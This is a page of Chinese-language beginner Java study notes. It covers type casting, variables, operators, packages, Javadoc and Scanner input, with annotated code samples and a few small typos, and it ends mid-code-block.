<p>低 ——————————————&gt;高</p>
<p>byte , short ,char -&gt; int -&gt; long -&gt; float -&gt; double</p>
<ul>
<li>运算中，不同类型的数据先转换为同一类型，然后进行运算。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calss3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">128</span>;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> (<span class="type">byte</span>)i;<span class="comment">//强制转换 byet最大值为127 ，所以内存溢出了。输出值变成了-128 //高--&gt;低</span></span><br><span class="line">        <span class="comment">//自动转换  低--高</span></span><br><span class="line">        System.out.println(b);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        1.不能对布尔值进行转换</span></span><br><span class="line"><span class="comment">        2.不能把对象类型转换为不相干的类型</span></span><br><span class="line"><span class="comment">        3.在把大容量转换为低容量的时候，强制转换</span></span><br><span class="line"><span class="comment">        4.转换的时候可能存在内存溢出</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">        System.out.println((<span class="type">int</span>)<span class="number">23.7</span>); <span class="comment">//23 会导致精度问题</span></span><br><span class="line">        System.out.println((<span class="type">int</span>)-<span class="number">45.89f</span>); <span class="comment">//-45</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span><span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> c+<span class="number">1</span>;<span class="comment">//转换成了int形式，低向高自动转换</span></span><br><span class="line">        System.out.println(d);</span><br><span class="line">        System.out.println((<span class="type">char</span>)d);<span class="comment">//强制转换为字符，输出为b</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//操作比较大的数的时候，注意溢出问题</span></span><br><span class="line">        <span class="comment">//JDK7新特性，数字直接可以用下划线分割</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">money</span> <span class="operator">=</span> <span class="number">10_0000_000</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">years</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">total</span> <span class="operator">=</span> money*years; <span class="comment">// 输出后返回的为数字，计算的时候溢出了</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">total2</span> <span class="operator">=</span> money*years;<span class="comment">//默认为Int，转换之前已经存在问题了，所以无用</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">total3</span> <span class="operator">=</span> money*((<span class="type">long</span>)years);<span class="comment">//先把一个数转换为long，则整个表达式提升，全部用Long计算，则不会内存溢出，就没事了。</span></span><br><span class="line">        System.out.println(tota3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量定义：可以把变化的量。</p>
<p>JAVA是一种强类型语言，每个变量都必须声明其类型。</p>
<p>JAVA变量是程序中最基本的存储单元，其要素包括变量名变量类型和作用域。</p>
<p>变量划分内存的空间</p>
<ul>
<li><p>作用域：</p>
<ul>
<li>类变量</li>
<li>实例变量</li>
</ul>
</li>
<li><p>局部变量</p>
</li>
</ul>
<hr>
<ul>
<li><p>格式 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  type varname	[=value] [&#123;,varName[=value]];</span><br><span class="line">  <span class="comment">//数据类型  变量名 =值；可以用逗号隔开来声明多个同类型变量。</span></span><br><span class="line">                             <span class="comment">//ps：老师不建议在一行里定义多个值，会看起来比较复杂。 </span></span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//int a,b,c; //定义a b c 为int类型</span></span><br><span class="line">       <span class="comment">//int a=1,b=2,c=3; //定义a,b,c三个的量，但是程序可读性不好</span></span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> c=<span class="number">3</span>; <span class="comment">//单独定义可读性会好</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span><span class="string">&quot;23333&quot;</span>; <span class="comment">//定义一个name为字符串</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">x</span> <span class="operator">=</span> <span class="string">&#x27;X&#x27;</span>; <span class="comment">//定义x为一个字符</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">pi</span> <span class="operator">=</span><span class="number">3.4</span>; <span class="comment">//定义pi为一个数字</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class08</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span> <span class="variable">salary</span> <span class="operator">=</span> <span class="number">2500</span>;<span class="comment">//加前期变量都加static，这个static定义了一个变量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例变量：从属于对象，如果不自行初始化，这个类型的默认值则为0 或0.0；所以14行输出了一个0</span></span><br><span class="line">    <span class="comment">//字符串初始化为16位的0000....，布尔值默认为false</span></span><br><span class="line">    <span class="comment">//除了以上的基本类型，其他的初始值都为null</span></span><br><span class="line">    String name; <span class="comment">//变量在类里</span></span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//属性：变量</span></span><br><span class="line">    <span class="comment">//main 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> i=<span class="number">10</span>;<span class="comment">//定义一个i为局部变量，只能在此处使用，且初始化值。</span></span><br><span class="line">        System.out.println();</span><br><span class="line">       <span class="comment">// 变量类型 变量名字 = new class08 ,相当于把自己拿到了。</span></span><br><span class="line">        <span class="type">class08</span> <span class="variable">class08</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">class08</span>();</span><br><span class="line">        System.out.println(class08);<span class="comment">//输出class08@1b6d3586</span></span><br><span class="line">        System.out.println(class08.age);<span class="comment">//输出0</span></span><br><span class="line">        System.out.println(class08.name);<span class="comment">//输出null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//其他方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<ul>
<li>常量 （Constant）:初始化 （initialize）后不能再改变值！不会编队的值。</li>
<li>所谓常量是一种特殊的变量，它的值被设定后，在程序运行过程中不允许被改变。</li>
</ul>
<p>格式：  ps:常量名一般使用大写字符</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> 变量名 值;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class09</span> &#123;</span><br><span class="line">    <span class="comment">//修饰符，不存在先后顺序 指final static double PI ,,等号之前的这些东西(但是谁=谁要定义好了)。</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">double</span> <span class="variable">PI</span> <span class="operator">=</span> <span class="number">3.14</span>; <span class="comment">//定义了一个静态的常量PI</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="变量的命名规范"><a href="#变量的命名规范" class="headerlink" title="变量的命名规范"></a>变量的命名规范</h3><ul>
<li>所有变量、方法、类名：见名知意。</li>
<li>类成员变量：首字母小写和驼峰原则：monthSalary 除了第一个单词以外，后面的单词首字母大写<ul>
<li>例 lastname lastName</li>
</ul>
</li>
<li>局部变量：首字母小写和驼峰原则</li>
<li>常量：大写字母和下划线：MAX_VALUE</li>
<li>类名：首字母大写和驼峰原则：Man,GoodMan</li>
<li>方法名：首字母小写和驼峰原则：run(),runRun()</li>
</ul>
<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="JAVA语言支持如下运算符："><a href="#JAVA语言支持如下运算符：" class="headerlink" title="JAVA语言支持如下运算符："></a>JAVA语言支持如下运算符：</h4><ul>
<li>算数运算符：+,-,*,&#x2F;,%（取余&#x3D;模运算）,++,–</li>
<li>赋值运算符： &#x3D;</li>
<li>关系运算符：&gt;,&lt;,&gt;&#x3D;,&lt;&#x3D;,&#x3D;&#x3D;（相等）,!&#x3D;（不等于），instanceof</li>
<li>逻辑运算符：&amp;&amp;,||,!  （与，或，如果是真则为假，如果是假则为真）</li>
<li>位运算符：&amp;，|,^，~,&gt;&gt;,&lt;&lt;,&gt;&gt;&gt;(了解！！！）</li>
<li>条件运算符？：</li>
<li>扩展赋值运算符：+&#x3D;，-&#x3D;，*&#x3D;，&#x2F;&#x3D;</li>
</ul>
<h2 id="IDEA创建包和MOVE"><a href="#IDEA创建包和MOVE" class="headerlink" title="IDEA创建包和MOVE"></a>IDEA创建包和MOVE</h2><p>点击src 右键 new —&gt; Package</p>
<p>此时弹出一个窗</p>
<p>Move :  项目名</p>
<p>To directory: 路径</p>
<p>Search in comments and strings （在字符串中搜索）</p>
<p>Search for text occurrences （所属出现的文本）  &#x2F;&#x2F;这两位默认勾选暂时不管</p>
<p>Open in editor（在编辑器中打开（也叫开放编辑））       &#x2F;&#x2F;此处勾选即可                       </p>
<pre><code>                                                         Refactor     Preview     Cancel
</code></pre>
<p>一次移动多个文件会出现 Refactoring Preview（重构预览）</p>
<p>点击 Do Refactor 即可 ps:原来这tm是个报错</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> base2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">long</span> a= <span class="number">12312345623156415L</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span><span class="number">123</span>;</span><br><span class="line">        <span class="type">short</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">        System.out.println(a+b+c+d);<span class="comment">//有一个数字类型为long则结果类型也为long，如果没有long则结果都为int，（待求证的理解）默认类型为int类型，加入其他类型后，加什么则跟什么，那么同时加了俩会怎么样呢?</span></span><br><span class="line">      <span class="comment">//  System.out.println((String) (c+d)); //触发报错：incovertible tpyes cannot cast &#x27;int&#x27; to &#x27;java.lang.String&#x27;</span></span><br><span class="line">                                                    <span class="comment">//无法将 int 类型转换为 String类型</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> base2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//++ -- 自增，自减  一元运算符</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">3</span>; <span class="comment">//定义a为3</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span>a++; <span class="comment">//就是 a给自己加个1 （a+1）</span></span><br><span class="line">        System.out.println(a);<span class="comment">//这个回合自增了一下//输出4 因为此时的a已经加了个1</span></span><br><span class="line">        System.out.println(b); <span class="comment">//输出3  也就是说b的值就是a的值，但b的值不是a++的值，a++仅是为了给a再次赋值，让a加1</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span>++a; <span class="comment">//自增后给c赋值 这个才是赋值回合</span></span><br><span class="line">        System.out.println(a);<span class="comment">//这个回合再次自增 输出5，c在原先a++的基础上，再次++a</span></span><br><span class="line">        System.out.println(b);<span class="comment">//输出3</span></span><br><span class="line">        System.out.println(c);<span class="comment">//输出5   ps: ++是自增，b = a++ b=a=3 和a++这个a的自增是没有关系的，只是++刚好在b=a这个赋值的时候</span></span><br><span class="line">        System.out.println(c);<span class="comment">//输出5   ps： 而 c =++a 将++放在了前面，则就是c = 再次自增的a</span></span><br><span class="line">        <span class="comment">//话不多说测试一波</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">f</span> <span class="operator">=</span> ++c; <span class="comment">//那么这个f 按照我的理解，f等于 自增后的c，那么输出应该等于6。测试一波</span></span><br><span class="line">        System.out.println(f); <span class="comment">//输出为6 ，没有问题</span></span><br><span class="line">        <span class="comment">//接着测试一波，g = f ++ ，按照我的理解，g = 6 ,f 在这条语句后变成了7</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">g</span> <span class="operator">=</span> f++;</span><br><span class="line">        System.out.println(g);</span><br><span class="line">        System.out.println(f);<span class="comment">//over 没有问题~~~</span></span><br><span class="line">         <span class="comment">//幂运算 //这些运算可以使用工具【类】来进行操作，java中有很多的类</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">pow</span> <span class="operator">=</span> Math.pow(<span class="number">2</span>,<span class="number">3</span>);<span class="comment">//Math类提供了很多的科学计算和常数捏</span></span><br><span class="line">        System.out.println(pow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> base2;</span><br><span class="line"><span class="comment">//逻辑运算符</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 与（and） 或（or） 非（取反）</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">a</span> <span class="operator">=</span><span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span><span class="literal">false</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;a %% b ：&quot;</span>+(a&amp;&amp;b));<span class="comment">//逻辑与运算：两个变量都为真，结果才为真，因为只有a是真所以输出假</span></span><br><span class="line">        System.out.println(<span class="string">&quot; a || b：&quot;</span>+(a||b));<span class="comment">//逻辑或运算：两个变量有一个为真则结果为真，因为有一个a是真所以结果是真</span></span><br><span class="line">        System.out.println(<span class="string">&quot;!(a &amp;&amp; b：)&quot;</span>+!(a&amp;&amp;b));<span class="comment">//如果是真，则变为家，如果是假则变为真，因为只有a是真，所以应该输出假，但是取反，输出真</span></span><br><span class="line">        <span class="comment">//短路运算</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">d</span> <span class="operator">=</span> (c&lt;<span class="number">4</span>)&amp;&amp;(c++&lt;<span class="number">4</span>);</span><br><span class="line">        System.out.println(d);<span class="comment">//这里输出了假，由于短路运算，在检测到假后后面的就不去考虑了，所以c++并没有运行，c的值还是4</span></span><br><span class="line">        System.out.println(c);<span class="comment">//这里c仍然是5</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//字符串的连接</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23333&quot;</span>+<span class="string">&quot;woc666&quot;</span>);<span class="comment">//字符串在输出中可以用加号连接捏</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> base2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        A = 0011 1100</span></span><br><span class="line"><span class="comment">        B = 0000 1101</span></span><br><span class="line"><span class="comment">        A&amp;B = 0000 1100 //两个都是1 才能得1（和相乘差不多）</span></span><br><span class="line"><span class="comment">        A|B = 0011 1101 //只要一个为1，则就是1 1|0=1酱紫得</span></span><br><span class="line"><span class="comment">        A^B = 0011 0001 //两个位置，相同则为0，否则则为1</span></span><br><span class="line"><span class="comment">        ~B  = 1111 0010 //取反，就是反过来啦~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        面试题：2*8 怎么运算最快？</span></span><br><span class="line"><span class="comment">        拆分到 2*2*2*2 正常运算需要电路，这个只需要增量（hhh记下来）</span></span><br><span class="line"><span class="comment">        &lt;&lt; 左移  相当于乘2</span></span><br><span class="line"><span class="comment">        &gt;&gt; 右移  相当于除2  （算法中效率贼高~~~）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        0000 0000 0</span></span><br><span class="line"><span class="comment">        0000 0001 1</span></span><br><span class="line"><span class="comment">        0000 0010 2</span></span><br><span class="line"><span class="comment">        0000 0011 3</span></span><br><span class="line"><span class="comment">        0000 0100 4</span></span><br><span class="line"><span class="comment">        0000 1000 8</span></span><br><span class="line"><span class="comment">        0001 0000 16</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="扩展运算符（偷懒计算-bushi-）"><a href="#扩展运算符（偷懒计算-bushi-）" class="headerlink" title="扩展运算符（偷懒计算(bushi)）"></a>扩展运算符（偷懒计算(bushi)）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> base2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        a+=b; <span class="comment">//a+=的意思就是a= a+b</span></span><br><span class="line">        a-=b; <span class="comment">// 意思为a = a-b</span></span><br><span class="line">        <span class="comment">//字符串连接</span></span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>+a+b);<span class="comment">//如果字符串连接符出现了前面，则后面所有的都会转换为String类型</span></span><br><span class="line">        System.out.println(a+b+<span class="string">&quot;&quot;</span>);<span class="comment">//正常运算，因为字符串连接符在后面</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> base2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// x ? y : z</span></span><br><span class="line">        <span class="comment">// 意思为 如果 x==true,则结果为y,否则结果为z</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span><span class="number">80</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> score &lt;<span class="number">60</span> ? <span class="string">&quot;不及格&quot;</span>:<span class="string">&quot;及格&quot;</span>;</span><br><span class="line">        System.out.println(type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ps :为了方便代码的使用和理解多打括号（）</p>
<h2 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h2><ul>
<li>为了更好的组织类，JAVA提供了包机制，用于区别类名的命名空间。</li>
<li>包语句的语法格式为：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg1[. pkg2[. pkg3...]];</span><br></pre></td></tr></table></figure>

<ul>
<li>一般利用公司域名倒置作为包铭；例：com.baidu.www</li>
<li>IDEA创建包会帮忙写好所属的包名：package xxxx;</li>
<li>import xxxx.xxx.xx;使用包</li>
</ul>
<h2 id="快捷键-Alt-回车-（生成错误信息）-然后自动找包-爱了爱了"><a href="#快捷键-Alt-回车-（生成错误信息）-然后自动找包-爱了爱了" class="headerlink" title="快捷键 Alt + 回车 （生成错误信息） 然后自动找包~~爱了爱了~"></a>快捷键 Alt + 回车 （生成错误信息） 然后自动找包~~爱了爱了~</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> base2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;<span class="comment">//这玩意必须在package的下面</span></span><br><span class="line">                        <span class="comment">//import xx.xx.xx就是路径，导入包，也可以导入自己的源码~~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// x ? y : z</span></span><br><span class="line">        <span class="comment">// 意思为 如果 x==true,则结果为y,否则结果为z</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span><span class="number">80</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> score &lt;<span class="number">60</span> ? <span class="string">&quot;不及格&quot;</span>:<span class="string">&quot;及格&quot;</span>;</span><br><span class="line">        System.out.println(type);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="骚操作-import-xx-xx-xx-会将第四个包下的所有类全导入进来捏"><a href="#骚操作-import-xx-xx-xx-会将第四个包下的所有类全导入进来捏" class="headerlink" title="骚操作 import xx.xx.xx.* 会将第四个包下的所有类全导入进来捏"></a>骚操作 import xx.xx.xx.* 会将第四个包下的所有类全导入进来捏</h4><h2 id="Java-Doc"><a href="#Java-Doc" class="headerlink" title="Java Doc"></a>Java Doc</h2><ul>
<li><p>作用：生成自己的API文档</p>
</li>
<li><p>参数信息：</p>
<ul>
<li>@author 作者名</li>
<li>@version 版本号</li>
<li>@since 指明需要最早使用的jdk版本</li>
<li>@param 参数名</li>
<li>@return 返回值情况</li>
<li>@throws 异常抛出情况</li>
</ul>
</li>
<li><p>官方帮助文档得地址捏：docs.oracle.com&#x2F;javase</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> base2;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> allure</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.8</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">doc</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**   //** +回车就星了</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于DIEA右键的翻译</p>
<p>Find Usages             | 搜索用法 
Analyze 					|分析
Refactor					|重新构建
——					
Bookmarks			   |书签
——
Browse type Hierarchy|浏览类型层次结构
Reformat Code 			 |格式化代码
Optimize Imports		  |优化包引用
Delete 							 |删除
Override File Type		 |覆盖文件类型
——
Build Module 			     |构建模块 
——
Open in Right Split         |从右边打开
Open in							|打开</p>
<p>——
Local History					|历史记录
Repair IDE						 |修复IDE
Reload from Disk			 |从磁盘重新加载
——
Compare With    			   |与…比较
Compart File with Editor  |将文件与编辑器比较
——
Diagrams							 |图表
——
Convert java File to Kotlin File|将Java文件转换为Kotlin文件</p>
<h2 id="javadoc的CMD命令"><a href="#javadoc的CMD命令" class="headerlink" title="javadoc的CMD命令"></a>javadoc的CMD命令</h2><p>javadoc -encoding UFT-8 -charset UTF-8 xx.java</p>
<p>​				-编码  参数  -字符 参数  xxx.java</p>
<h2 id="使用IDEA生成javadoc"><a href="#使用IDEA生成javadoc" class="headerlink" title="使用IDEA生成javadoc"></a>使用IDEA生成javadoc</h2><ol>
<li>点击上方的Tool </li>
<li>点击Generate JavaDoc</li>
<li>Out put directory: 则是生成的文档的路径捏</li>
<li>设置各项参数 Loacale:填写zh_CN可以指定以中文格式生成捏</li>
<li>Other command line arguments: 输出配置 就是cmd javadoc 后面写的那些了~~呐呐</li>
</ol>
<h1 id="JAVA流程控制"><a href="#JAVA流程控制" class="headerlink" title="JAVA流程控制"></a>JAVA流程控制</h1><ol>
<li>用户交互Scanner</li>
<li>顺序结构</li>
<li>选择结构</li>
<li>循环结构</li>
<li>Break &amp; continue</li>
<li>练习</li>
</ol>
<ul>
<li><p><strong>Scanner 对象</strong></p>
</li>
<li><p>通过Java给我们提供的工具类，我们可以获取用户的输入。java.util.Sacnner 是Java5的新特征，我们可以通过Scanner类来获取用户的输入。</p>
</li>
<li><p>基本语法：</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br></pre></td></tr></table></figure>

<ul>
<li>通过Scanner类的next()与nextLine()方法获取输入的字符串，在读取前我们一般需要使用 hasNext()与hasNextLine()判断是否还有输入的数据。</li>
</ul>
<h3 id="next接收"><a href="#next接收" class="headerlink" title="next接收"></a>next接收</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建一个扫描器对象，用于接收键盘数据</span></span><br><span class="line">      <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in); <span class="comment">//接收用户的输入 并封装成scanner对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;使用next方式接收：&quot;</span>);</span><br><span class="line">        <span class="comment">///判断用户有没有输入字符串</span></span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;<span class="comment">//默认这个里面为判断==true</span></span><br><span class="line">            <span class="comment">//使用next的方式接收</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.next(); <span class="comment">//程序等待用户输入完毕</span></span><br><span class="line">            System.out.println(<span class="string">&quot;用户输入的内容为&quot;</span> + str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span 